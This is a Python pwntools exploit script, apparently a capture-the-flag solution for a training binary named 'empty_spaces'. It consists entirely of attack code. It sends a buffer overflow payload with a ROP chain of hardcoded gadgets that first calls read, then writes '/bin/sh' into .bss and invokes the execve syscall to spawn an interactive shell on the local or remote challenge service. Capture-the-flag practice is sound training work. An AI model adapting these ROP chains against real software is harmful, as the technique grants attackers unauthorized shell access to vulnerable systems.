from pwn import *

CHALL_PATH = "./empty_spaces"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x40198c
c

"""
if args.REMOTE:
    c = remote("empty-spaces.training.offensivedefensive.it", "8080", ssl=True)
elif args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
else:
    c = process(CHALL_PATH)

POP_RDI = 0x4787b3 # pop rdi; ret;
POP_RSI = 0x477d3d # pop rsi; ret;
POP_RAX_RDX = 0x45db52 # pop rax; pop rdx; leave; ret;
POP_RDX = 0x45db53 # pop rdx; leave; ret;
POP_RAX = 0x42146b #pop rax; ret;
SYSCALL_RET = 0x40ba76 # syscall; ret;
SYSCALL = 0x401324 # syscall
MOV_CHAIN = 0x4690f0 # mov rdx, qword ptr [rsi]; mov qword ptr [rdi], rdx; ret;
WRITE_BIN_SH_ADDR = 0x4aa050
MOV_RSP_RSI = 0x401910 # mov rsp, rsi; ret;
MOV_RBP_RSP = 0x419421 # mov rbp, rsp; call rax;
BSS = 0x4aa123
POP_RBP = 0x40191f# nop; pop rbp; ret;
READ_RET = 0x401987
NEW_POP_RDX = 0x4447d5# pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
BUFFER_INIT = 0x4141414141414141
ADD_RSP = 0x401016 # add rsp, 8; ret;
MOV_RAX_RDI = 0x401c46 #mov rax, rdi; ret;
MOV_RAX_RDX= 0x43fa76 # nop; mov qword ptr [rax], rdx; xor eax, eax; ret; 

payload=(b"/bin/sh\0"*9)

payload+=(p64(0x4447d5)) #0x00000000004447d5: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret; 
payload+=(p64(0xf0))
payload+=(p64(0x42146b)) #0x000000000042146b: pop rax; ret;
payload+=(p64(0x0))
payload+=(p64(0x4787b3)) #0x00000000004787b3: pop rdi; ret;
payload+=(p64(0x0))
payload+=(p64(0x40ba76)) #0x000000000040ba76: syscall; ret;
payload+=(p64(0))
c.sendline(payload)

payload1=(b"/bin/sh\0"*8)

payload1+=(p64(0x4447d5)) #0x00000000004447d5: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret; 
payload1+=(p64(0xf0))
payload1+=(p64(0x42146b))  #0x000000000042146b: pop rax; ret;
payload1+=(p64(0x0))
payload1+=(p64(0x4787b3)) #0x00000000004787b3: pop rdi; ret;
payload1+=(p64(0x0))
payload1+=(p64(0x40ba76)) #0x000000000040ba76: syscall; ret;
payload1+=(p64(0x4447d5)) #0x00000000004447d5: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret; 

#real second rip
payload1+=(p64(0x4447d5))#0x00000000004447d5: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
payload1+=(b"/bin/sh\x00") 
payload1+=(p64(0x42146b))  #0x000000000042146b: pop rax; ret;
payload1+=(p64(0x4aa123))  #.bss
payload1+=(p64(0x43fa76)) # nop; mov qword ptr [rax], rdx; xor eax, eax; ret; 

payload1+=(p64(0x4447d5))#0x00000000004447d5: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
payload1+=(p64(0)) 
payload1+=(p64(0x42146b))  #0x000000000042146b: pop rax; ret;
payload1+=(p64(0x3b))
payload1+=(p64(0x4787b3)) #0x00000000004787b3: pop rdi; ret;
payload1+=(p64(0x4aa123)) #.bss
payload1+=(p64(0x477d3d)) #0x0000000000477d3d: pop rsi; ret;
payload1+=(p64(0x0))
payload1+=(p64(0x40ba76)) #0x000000000040ba76: syscall; ret;

c.sendline(payload1)
c.interactive()